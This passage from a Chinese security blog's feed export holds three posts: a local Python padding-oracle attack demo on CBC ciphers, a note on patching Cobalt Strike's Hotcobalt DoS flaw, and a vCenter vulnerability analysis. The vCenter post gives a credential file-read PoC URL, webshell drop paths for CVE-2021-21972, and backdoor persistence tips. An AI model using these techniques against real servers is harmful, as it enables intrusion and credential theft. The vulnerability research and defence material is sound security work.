IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;3DES&quot;</span> <span class="keyword">and</span> key_len == <span class="number">16</span>:</span><br><span class="line">        cipher_object = DES3.new(SMKEY, DES3.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    plaintext = padding_pkcs(plaintext, len(IV))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher_object.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_decrypt</span>(<span class="params">cipher_bytes, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (len(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>) <span class="keyword">or</span> (len(IV) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">        print(<span class="string">&quot;[-] cipher_bytes length != IV length&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        cipher_object = AES.new(SMKEY, AES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;ARC2&quot;</span>:</span><br><span class="line">        cipher_object = ARC2.new(SMKEY, ARC2.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;Blowfish&quot;</span>:</span><br><span class="line">        cipher_object = Blowfish.new(SMKEY, Blowfish.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;CAST&quot;</span>:</span><br><span class="line">        cipher_object = CAST.new(SMKEY, CAST.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;DES&quot;</span>:</span><br><span class="line">        cipher_object = DES.new(SMKEY, DES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;3DES&quot;</span>:</span><br><span class="line">        cipher_object = DES3.new(SMKEY, DES3.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher_object.decrypt(cipher_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_block</span>(<span class="params">any_bytes, block_size=<span class="number">8</span></span>):</span></span><br><span class="line">    any_len = len(any_bytes)</span><br><span class="line">    <span class="keyword">if</span> any_len % block_size != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split any_bytes by block_size</span></span><br><span class="line">    <span class="keyword">return</span> [any_bytes[offset:offset+block_size] <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, any_len, block_size)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_iv</span>(<span class="params">block_iv_list, block_intermediary_list, padding_byte</span>):</span></span><br><span class="line">    block_iv_list_len = len(block_iv_list)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_iv_list_len):</span><br><span class="line">        block_iv_list[i] = chr(ord(block_intermediary_list[i]) ^ padding_byte)</span><br><span class="line">    <span class="keyword">return</span> block_iv_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_pkcs</span>(<span class="params">plain_bytes, padding_byte</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(plain_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Exact Block Number</span></span><br><span class="line">    points = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate Points</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, padding_byte+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> plain_bytes[-i] == padding_byte:</span><br><span class="line">            points += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> points == padding_byte:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_block</span>(<span class="params">cipher_bytes, block_size, next_iv, SMKEY, CIPHER</span>):</span></span><br><span class="line">    block_dict = &#123;&#125;</span><br><span class="line">    block_plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    block_intermediary_list = []</span><br><span class="line">    block_iv_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct Padding Bytes</span></span><br><span class="line">    <span class="keyword">for</span> padding_byte <span class="keyword">in</span> range(<span class="number">1</span>, block_size+<span class="number">1</span>):</span><br><span class="line">        tmp_iv_list = []</span><br><span class="line">        block_iv_list = set_iv(block_iv_list, block_intermediary_list, padding_byte)</span><br><span class="line">        block_iv_list_len = len(block_iv_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Initialize IV</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>, block_size - padding_byte):</span><br><span class="line">            tmp_iv_list.append(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        tmp_iv_list.append(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        tmp_iv_list_len = len(tmp_iv_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Brute Force</span></span><br><span class="line">        <span class="keyword">for</span> iv_ascii <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment"># Edit item by list</span></span><br><span class="line">            try_iv_list = tmp_iv_list</span><br><span class="line">            try_iv_list[tmp_iv_list_len<span class="number">-1</span>] = chr(iv_ascii)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># list to string</span></span><br><span class="line">            try_iv_str = <span class="string">&quot;&quot;</span>.join(try_iv_list)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Reverse Append</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_iv_list_len):</span><br><span class="line">                try_iv_str += block_iv_list[block_iv_list_len<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Trigger Decrypt[Rewrite]</span></span><br><span class="line">            plain_bytes = cbc_decrypt(cipher_bytes, try_iv_str.encode(<span class="string">&quot;latin1&quot;</span>), SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check Error[Rewrite]</span></span><br><span class="line">            flag = check_pkcs(plain_bytes, padding_byte)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the Silver Bullet</span></span><br><span class="line">            <span class="comment"># Dynamic Array append O(1)</span></span><br><span class="line">            block_iv_list.append(chr(iv_ascii))</span><br><span class="line">            block_intermediary_list.append(chr(iv_ascii ^ padding_byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Revert block_intermediary and block_plaintext</span></span><br><span class="line">    block_intermediary_list_len = len(block_intermediary_list)</span><br><span class="line">    block_dict[<span class="string">&quot;intermediary&quot;</span>] = <span class="string">&quot;&quot;</span>.join(block_intermediary_list[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> next_iv != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_intermediary_list_len):</span><br><span class="line">            block_plaintext += chr(next_iv[i] ^ ord(block_intermediary_list[block_intermediary_list_len<span class="number">-1</span>-i]))</span><br><span class="line">        block_dict[<span class="string">&quot;plaintext&quot;</span>] = block_plaintext</span><br><span class="line">    <span class="keyword">return</span> block_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_decrypt</span>(<span class="params">cipher_bytes, block_size, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    next_iv = IV</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split cipher_bytes by block_size</span></span><br><span class="line">    cipher_blocks = split_block(cipher_bytes, block_size)</span><br><span class="line">    <span class="keyword">if</span> cipher_blocks == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Split Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    result_dict = &#123;&#125;</span><br><span class="line">    result_dict[<span class="string">&quot;intermediary&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">    result_dict[<span class="string">&quot;plaintext&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Attack block by block</span></span><br><span class="line">    <span class="keyword">for</span> cipher_block <span class="keyword">in</span> cipher_blocks:</span><br><span class="line">        <span class="comment"># Get This Block Intermediary and Plaintext</span></span><br><span class="line">        block_dict = oracle_block(cipher_block, block_size, next_iv, SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add Block Result</span></span><br><span class="line">        result_dict[<span class="string">&quot;intermediary&quot;</span>] += block_dict[<span class="string">&quot;intermediary&quot;</span>]</span><br><span class="line">        result_dict[<span class="string">&quot;plaintext&quot;</span>] += block_dict[<span class="string">&quot;plaintext&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set IV to next cipher_block</span></span><br><span class="line">        next_iv = cipher_block</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    x_len = len(x)</span><br><span class="line">    y_len = len(y)</span><br><span class="line">    <span class="keyword">if</span> x_len != y_len:</span><br><span class="line">        print(<span class="string">&quot;[-] str_xor Length Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># type(bytearray[i]) is int</span></span><br><span class="line">    z = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x_len):</span><br><span class="line">        z += chr(ord(x[i]) ^ y[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_encrypt</span>(<span class="params">WPSTRING, cipher_bytes, block_size, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="comment"># String to ByteArray</span></span><br><span class="line">    plaintext = bytearray(WPSTRING, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    plaintext = padding_pkcs(plaintext, block_size)</span><br><span class="line">    <span class="comment"># Split plaintext by block_size and Reverse</span></span><br><span class="line">    plaintext_blocks = split_block(plaintext, block_size)</span><br><span class="line">    plaintext_blocks.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split cipher_bytes by block_size</span></span><br><span class="line">    cipher_blocks = split_block(cipher_bytes, block_size)</span><br><span class="line">    cipher_blocks_num = len(cipher_blocks)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the Last One Block</span></span><br><span class="line">    payload = cipher_blocks[<span class="number">-1</span>]</span><br><span class="line">    prev_block_bytes = cipher_blocks[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> plaintext_block <span class="keyword">in</span> plaintext_blocks:</span><br><span class="line">        <span class="comment"># Get the block_intermediary</span></span><br><span class="line">        block_dict = oracle_block(prev_block_bytes, block_size, <span class="string">&quot;&quot;</span>, SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get the Cipher Block</span></span><br><span class="line">        prev_block_bytes = str_xor(block_dict[<span class="string">&quot;intermediary&quot;</span>], plaintext_block).encode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = prev_block_bytes + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># Origin Plaintext</span></span><br><span class="line">    OPSTRING = <span class="string">&quot;abcdefghabcdefghxxxxxx&quot;</span></span><br><span class="line">    <span class="comment"># Want Plaintext</span></span><br><span class="line">    WPSTRING = <span class="string">&quot;aaaaaaaaaaaaaaaa\r\n\tzzz&quot;</span></span><br><span class="line"></span><br><span class="line">    CIPHER = <span class="string">&quot;AES&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;ARC2&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;Blowfish&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;CAST&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;DES&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;3DES&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Intermediary Value</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        IV = <span class="string">b&quot;1234567812345678&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        IV = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">    <span class="comment"># Symmetric Key</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER != <span class="string">&quot;DES&quot;</span>:</span><br><span class="line">        SMKEY = <span class="string">b&quot;~!@#$%^&amp;*()_+`-=&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        SMKEY = <span class="string">b&quot;~!@#$%^&amp;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES Per-Block Size is 16</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        block_size = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        block_size = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># IV must same as block_size</span></span><br><span class="line">    <span class="keyword">if</span> len(IV) != block_size:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># CBC Encrypt</span></span><br><span class="line">    cipher_bytes = cbc_encrypt(OPSTRING, IV, SMKEY, CIPHER)</span><br><span class="line">    <span class="keyword">if</span> cipher_bytes == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Encrypt Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Padding Oracle Decrypt</span></span><br><span class="line">    result_dict = oracle_decrypt(cipher_bytes, block_size, IV, SMKEY, CIPHER)</span><br><span class="line">    <span class="keyword">if</span> result_dict == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Attack Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    print(result_dict)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Configuring Payload in Local</span></span><br><span class="line">    payload = oracle_encrypt(WPSTRING, cipher_bytes, block_size, SMKEY, CIPHER)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CBC Decrypt</span></span><br><span class="line">    <span class="comment"># plain_bytes = cbc_decrypt(cipher_bytes, IV, SMKEY, CIPHER)</span></span><br><span class="line">    plain_bytes = cbc_decrypt(payload[block_size:], payload[:block_size], SMKEY, CIPHER)</span><br><span class="line">    print(plain_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">Cipher block chaining (CBC)</a></p><p><a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html">Automated Padding Oracle Attacks With PadBuster</a></p><p><a href="https://www.cnblogs.com/zlhff/p/5519175.html">Padding Oracle Attack的一些细节与实现</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据加解密时是否用同一组密钥，可以分为对称加密和非对称加密。对称加密中根据对数据处理粒度的不同，可以分为分组加密算法（AES、3DES、DES、Blowfish、RC2、CAST）和流加密算法（ChaCha20、Salsa20、RC4）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见的非对</summary>
      
    
    
    
    <category term="密码学" scheme="https://hosch3n.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="crypto" scheme="https://hosch3n.github.io/tags/crypto/"/>
    
    <category term="cbc" scheme="https://hosch3n.github.io/tags/cbc/"/>
    
  </entry>
  
  <entry>
    <title>关于修复Hotcobalt的一些小想法</title>
    <link href="https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/"/>
    <id>https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/</id>
    <published>2021-08-05T16:21:54.000Z</published>
    <updated>2021-08-15T10:18:14.734Z</updated>
    
    <content type="html"><![CDATA[<p>官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被控客户端返回的数据中声明的文件大小这个值做校验，导致后续申请内存空间时的大小是被控客户端可控的，可以被用来一直申请内存直到占满宕机。</p><p>由于一些众所周之的原因，现在没法更新4.4版本，更不可能补丁对比。但是5年前3.5版本的RCE漏洞其实跟这个有点类似（downloads时ip的位置被控客户端可控，可以被替换为<code>../</code>路径穿越），官方当时的修复措施之一就是判断了beacon在download前有没有过至少一次交互：</p><blockquote><p>The Team Server now checks that the beacon has been tasked at least once before allowing most callback responses from the beacon. This ensures that an attacker can’t stage a fake beacon and start spoofing responses without the operator first interacting with the beacon.</p></blockquote><p>大概猜了下关键字然后全局搜索，在BeaconC2.java中看到了相关判断代码：</p><p><img src="/img/gyxfhcxf_a.png"></p><p>CobaltStrikeParser模拟的beacon上线一般没有实际命令交互的，就能被这个判断给拦下来。所以把这段代码复制到漏洞相关的分支即可：</p><p><img src="/img/gyxfhcxf_b.png"></p><p>重新编译后测试上线可以正常使用截图功能：</p><p><img src="/img/gyxfhcxf_c.png"></p><ul><li>惭愧的是虽然看上去是这么一回事，但是没有仔细去看<a href="https://github.com/Sentinel-One/CobaltStrikeParser/blob/master/extra/communication_poc.py">communication_poc.py</a>和实际打一下做试验。所以只是作为一个抛砖引玉的想法，说错了的话请师傅们拍砖。</li></ul><p>除了这个代码判断外，它默认用的是空UA头<code>EMPTY_UA_HEADERS = &#123;&quot;User-Agent&quot;:&quot;&quot;&#125;</code>发起请求，在profile中屏蔽掉空UA头可以起到缓解作用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">    ...</span><br><span class="line">    set block_useragents &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更进一步可以直接关掉stager这个功能，基本就断了CobaltStrikeParser这类蹭payload去解析的工具路子，但是对后渗透会有很大影响：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure><p>当然也可以像<a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#stager">之前</a>说的，改掉checksum8上线规则、修改默认的抑或密钥、stager下发完payload随时kill掉这些方法辅助规避payload泄漏。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.cobaltstrike.com/2021/08/04/cobalt-strike-dos-vulnerability-cve-2021-36798/">Cobalt Strike DoS Vulnerability (CVE-2021-36798)</a></p><p><a href="https://labs.sentinelone.com/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/">Hotcobalt – New Cobalt Strike DoS Vulnerability That Lets You Halt Operations</a></p><p><a href="https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/">Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="idea" scheme="https://hosch3n.github.io/tags/idea/"/>
    
    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
    
    <category term="CVE-2021-36798" scheme="https://hosch3n.github.io/tags/CVE-2021-36798/"/>
    
  </entry>
  
  <entry>
    <title>VMware vCenter漏洞分析</title>
    <link href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-07-06T02:46:27.000Z</published>
    <updated>2021-08-05T17:27:59.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>vSphere Client分为UI层、Java服务层、后端层，前端通过RESTful API与基于Spring MVC和OSGI框架的Java服务层进行通信。</p><p><img src="/img/vcenterldfx_a.png"></p><p>vCenter可以安装部署至ESXi，也可以导入镜像中的OVA文件部署，漏洞环境的ISO文件可从<a href="https://blog.whsir.com/?s=%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8">此处</a>获取。需要注意的是VCSA的最小部署规格tiny（微型）需要2核10G内存300G硬盘，本文采用的方案为在ESXi的物理机上嵌套安装ESXi虚拟机，并在嵌套安装的ESXi虚拟机中安装VCSA。保持根路由与一级ESXi物理机VLAN为空（或不变/或为4095），将一级ESXi与二级ESXi的虚拟交换机设置为4095（或某个固定值），将二级ESXi中运行的VCSA接入二级虚拟交换机，并同时开启该链路上的各级交换机的混杂模式。</p><h2 id="File-Read"><a href="#File-Read" class="headerlink" title="File Read"></a>File Read</h2><p>由EAM用户运行的服务存在文件读取，Windows上可获取帐号密码。</p><p>影响版本：</p><ul><li>6.0 &lt;= vCenter Server &lt;= 6.5 f &lt; 6.5 u1</li></ul><p>POC：<code>https://1.1.1.1/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</code></p><h2 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h2><p>默认启用的vROps插件（com.vmware.vropspluginui.mvc）ServicesController类的uploadova接口存在未授权访问，可利用路径穿越将文件解压至特定目录实现getshell。</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U1c</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3l</li><li>6.5 1e &lt;= vCenter Server &lt; 6.5 U3n</li><li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2</li><li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.1.2</li></ul><p>EXP：<a href="https://www.exploit-db.com/exploits/49602">VMware vCenter Server 7.0 - Unauthenticated File Upload</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>用root帐号ssh连上vCenter，找到vropsplugin-service.jar利用<code>python3 -m http.server 8010</code>下载到本地<a href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/#LV1">反编译</a>：</p><p><img src="/img/vcenterldfx_b.png"></p><p>从post上传的输入流中解析tar遍历文件，创建File类拼接目录时存在<code>../../</code>目录穿越，可将文件解压至vsphere-ui用户有权限的目录。切入该用户并查找可写目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su vsphere-ui</span><br><span class="line">find / -writable -<span class="built_in">type</span> d |&amp; grep -v <span class="string">&quot;Permission denied&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/vcenterldfx_c.png"></p><p><code>.ssh</code>可写就能上传公钥，并通过安装VCSA时通常都会开启的SSH服务连上来，但我们先看一下shadow文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /etc/shadow</span></span><br><span class="line">...</span><br><span class="line">vsphere-ui:!:18802:1:90:7:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由冒号分隔的各项分别代表：</p><ul><li>用户名</li><li>哈希算法、盐、哈希密码</li><li>最后一次密码修改时间（距1970年1月1日天数）</li><li>最小密码修改间隔时间</li><li>密码过期时间</li><li>密码过期前警告时间</li><li>密码过期后宽限时间</li><li>账号失效时间</li><li>保留字段</li></ul><p>看到密码过期时间为90天，因此在安装90天后即使写入了公钥登录也会提示密码过期，需要提供原密码并修改密码：</p><p><img src="/img/vcenterldfx_d.png"></p><p>vsphere-ui用户的第二项为<code>!</code>，这表示该用户未设置密码（与空密码不同），所以也就没法修改密码。。。</p><p>写文件getshell需要充分利用各种服务，遍历找出存在有jsp的web.xml并与可写目录交叉对比：</p><p><img src="/img/vcenterldfx_e.png"></p><p>由<code>/usr/lib/vmware-vsphere-ui/server/configuration/tomcat-server.xml</code>查到监听端口为5090，再由rhttpproxy反向代理找到web访问路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep 5090 /etc/vmware-rhttpproxy/endpoints.conf.d/*</span></span><br><span class="line">/ui/healthstatus <span class="built_in">local</span> 5090 redirect allow</span><br><span class="line">/ui <span class="built_in">local</span> 5090 redirect allow</span><br></pre></td></tr></table></figure><ul><li>靠前的redirect表示将http重定向到https，后面的allow表示允许https访问</li><li><code>META-INF/MANIFEST.MF</code>中的<code>Web-ContextPath</code>也会标识web路径</li></ul><p>最后将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/</code>目录或其子目录，即可解析并由<code>https://1.1.1.1/ui/resources/webshell.jsp</code>访问</p><p>该路径中的42并非是固定数值，会随着重装重启等行为发生改变，所以构造上传包时可以暴力批量添加，并利用解压时的容错性释放。</p><p><img src="/img/vcenterldfx_f.png"></p><p>6.7U2及之后的版本，会在服务启动时判断如果存在work目录就删除，也就是说Web是跑在内存里面的。这时对于6.7U2及更新的6.7版本可以将webshell释放至<code>/usr/lib/vmware-vsphere-ui/server/static/resources/libs/</code>目录作为后门，待其重启后会被加载运行。对于7.0版本static后面的resources会跟一串动态数字路径，能够在请求的返回包中获取到。</p><ul><li>Windows由于权限控制并不严格，可以将webshell释放至<code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code>目录，会以system权限运行</li></ul><h2 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h2><p>默认启用的Virtual SAN Health Check插件（vsan-h5-client.zip）<code>/rest/*</code>接口存在未授权访问，可利用不安全的反射调用实现getshell。</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U2b</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3n</li><li>6.5 &lt;= vCenter Server &lt; 6.5 U3p</li><li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</li><li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</li></ul><p>EXP：<a href="https://github.com/hosch3n/vCenterExp/blob/main/21985.py">vCenterExp</a></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" 